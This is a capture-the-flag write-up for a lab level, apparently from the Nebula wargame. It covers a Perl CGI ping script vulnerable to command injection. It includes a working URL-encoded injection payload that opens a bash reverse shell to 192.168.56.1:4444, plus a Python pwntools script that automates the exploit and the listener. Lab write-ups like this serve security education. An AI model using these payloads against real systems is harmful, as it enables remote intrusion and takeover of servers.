# Level 07

## Discription

> The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server. \
\
> To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.

## Source Code

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

## Solution

It's a RCE challenge. First the program calls ping function with argument `Host`. 

```perl
ping(param("Host"));
```

Then it assigns value of Host parameter to $host variable then start a HTML document and set page title to Ping Results.

```perl
$host = $_[0];
print("<html><head><title>Ping results</title></head><body><pre>");
```

Here is the vulnerable part, it executes ping command with IP supplied by user or $host variable.

```perl
@output = `ping -c 3 $host 2>&1`;
```

 And in the end it prints out the output and end the HTML document.

```perl
foreach $line (@output) { print "$line"; }
print("</pre></body></html>");
```

As we know from one of the previous challenge that we can run more than one command on same line with bash using ; sign, so we will do the same here. Remember we have to use urlencoding. Lets curl this out - 

```bash
curl http://192.168.56.105:7007/index.cgi?Host=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%3B%23
```

<img src="Images/solution.png" style="zoom:200%;" />

## Python



```python
#!/usr/bin/python3

from requests import get
from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target IP Local IP") 

local_pro = process(['nc','-nvlp','4444'])
try:
	get(f'http://192.168.56.105:7007/index.cgi?Host=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{argv[2]}%2F4444%200%3E%261%3B%23',timeout=1)
except:
	local_pro.sendline('getflag')
	local_pro.interactive()
```

